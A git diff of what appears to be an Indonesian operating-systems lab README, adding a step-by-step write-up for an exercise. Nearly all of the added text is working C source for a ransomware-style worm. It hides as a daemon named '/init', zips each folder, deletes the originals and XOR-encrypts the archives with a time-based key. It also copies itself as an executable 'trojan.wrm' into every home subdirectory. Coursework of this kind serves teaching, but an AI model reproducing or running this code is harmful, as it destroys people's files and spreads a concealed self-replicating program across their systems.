@@ -262,8 +262,224 @@
     return EXIT_SUCCESS;
 }
 </pre>
-<h3>Note untuk soal 3</h3>
-Untuk error handling ketika ./starterkit --x, outputnya harus konsisten (seperti ini "fprintf(stderr, "Usage: %s --decrypt | --quarantine | --return | --eradicate | --shutdown\n", argv[0]);")
+<h3>Note untuk soal 2</h3>
+Untuk error handling ketika ./starterkit --x, outputnya harus konsisten (seperti ini "Usage: %s --decrypt | --quarantine | --return | --eradicate | --shutdown\n")
 
 # Soal 3
+1. Import library yang diperlukan
+<pre>
+     #define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
+#include <string.h>
+#include <dirent.h>
+#include <time.h>
+#include <errno.h>
+#include <libgen.h>
+#include <zip.h>
+#include <stdint.h>
+#include <sys/wait.h>
+</pre>
+2. Function daemonize yang selalu berjalan di latar belakang
+<pre>
+     void daemonize() {
+    pid_t pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) exit(EXIT_SUCCESS); 
+
+    setsid();
+    umask(0);
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+     }
+</pre>
+3. Function XOR untuk mengenkripsi seluruh file di dalam direktori dimana malware berada
+<pre>
+     void xor_file(const char *filepath, uint8_t key) {
+    FILE *fp = fopen(filepath, "rb+");
+    if (!fp) return;
+
+    fseek(fp, 0, SEEK_END);
+    long size = ftell(fp);
+    rewind(fp);
+
+    uint8_t *buffer = malloc(size);
+    fread(buffer, 1, size, fp);
+
+    for (long i = 0; i < size; i++) {
+        buffer[i] ^= key;
+    }
+
+    rewind(fp);
+    fwrite(buffer, 1, size, fp);
+
+    fclose(fp);
+    free(buffer);
+     }
+</pre>
+4. Mengubah seluruh file yang telah di enkripsi menjadi zip
+<pre>
+     char *zip_folder(const char *folderpath) {
+    char zipname[1024];
+    snprintf(zipname, sizeof(zipname), "%s.zip", folderpath);
+
+    int errorp;
+    zip_t *zip = zip_open(zipname, ZIP_CREATE | ZIP_TRUNCATE, &errorp);
+    if (!zip) return NULL;
+
+    DIR *dir;
+    struct dirent *entry;
+    char path[1024];
+
+    if ((dir = opendir(folderpath)) != NULL) {
+        while ((entry = readdir(dir)) != NULL) {
+            if (entry->d_type == DT_REG || entry->d_type == DT_DIR) {
+                if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+                    continue;
+
+                snprintf(path, sizeof(path), "%s/%s", folderpath, entry->d_name);
+
+                struct stat st;
+                stat(path, &st);
+                if (S_ISREG(st.st_mode)) {
+                    zip_source_t *source = zip_source_file(zip, path, 0, 0);
+                    if (source)
+                        zip_file_add(zip, entry->d_name, source, ZIP_FL_OVERWRITE);
+                }
+            }
+        }
+        closedir(dir);
+    }
+
+    zip_close(zip);
+    return strdup(zipname);
+     }
+</pre>
+5. Menghapus file original yang sebelumnya telah dirubah menjadi ZIP
+<pre>
+        void delete_folder(const char *path) {
+    DIR *d = opendir(path);
+    size_t path_len = strlen(path);
+    struct dirent *p;
+    if (!d) return;
+
+    while ((p = readdir(d))) {
+        if (strcmp(p->d_name, ".") == 0 || strcmp(p->d_name, "..") == 0)
+            continue;
+
+        char full_path[1024];
+        snprintf(full_path, sizeof(full_path), "%s/%s", path, p->d_name);
+        struct stat st;
+        if (!stat(full_path, &st)) {
+            if (S_ISDIR(st.st_mode)) {
+                delete_folder(full_path);
+            } else {
+                remove(full_path);
+            }
+        }
+    }
+    closedir(d);
+    rmdir(path);
+     }
+</pre>
+6. Function wannacryptor
+<pre>
+        void wannacryptor() {
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+
+    DIR *dir = opendir(cwd);
+    struct dirent *entry;
+    if (!dir) return;
+
+    time_t t = time(NULL);
+    uint8_t key = (uint8_t)(t % 256);
+
+    while ((entry = readdir(dir))) {
+        if (entry->d_type == DT_DIR) {
+            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+                continue;
+
+            char folderpath[1024];
+            snprintf(folderpath, sizeof(folderpath), "%s/%s", cwd, entry->d_name);
+
+            char *zipfile = zip_folder(folderpath);
+            if (zipfile) {
+                delete_folder(folderpath);
+                xor_file(zipfile, key);
+                free(zipfile);
+            }
+        }
+    }
+    closedir(dir);
+     }
+</pre>
+7. Function spread malware untuk menyebarkan file malware dan trojan keseluruh direktori didalm direktori home
+<pre>
+     void spread_malware() {
+    const char *home = getenv("HOME");
+    if (!home) return;
+
+    DIR *dir = opendir(home);
+    struct dirent *entry;
+
+    char self_path[1024];
+    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+    if (len == -1) return;
+    self_path[len] = '\0';
+
+    if (!dir) return;
+    while ((entry = readdir(dir))) {
+        if (entry->d_type != DT_DIR) continue;
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+
+        char target_dir[1024];
+        snprintf(target_dir, sizeof(target_dir), "%s/%s", home, entry->d_name);
+
+        char target_path[1024];
+        snprintf(target_path, sizeof(target_path), "%s/trojan.wrm", target_dir);
+
+        FILE *src = fopen(self_path, "rb");
+        FILE *dst = fopen(target_path, "wb");
+        if (!src || !dst) {
+            if (src) fclose(src);
+            if (dst) fclose(dst);
+            continue;
+        }
+
+        char buf[4096];
+        size_t bytes;
+        while ((bytes = fread(buf, 1, sizeof(buf), src)) > 0) {
+            fwrite(buf, 1, bytes, dst);
+        }
+
+        fclose(src);
+        fclose(dst);
+        chmod(target_path, 0755);
+    }
+    closedir(dir);
+     }
+</pre>
+8. Function main untuk menjalankan seluruh function diatas
+<pre>
+     int main() {
+    daemonize();
+    sleep(5);
+    wannacryptor();
+    spread_malware(); 
+    while (1) sleep(10);
+}
+</pre>
+<h3>Note untuk soal 3</h3>
+kodenya bisa diselesaikan lagi sampai selesai.
+
 # Soal 4
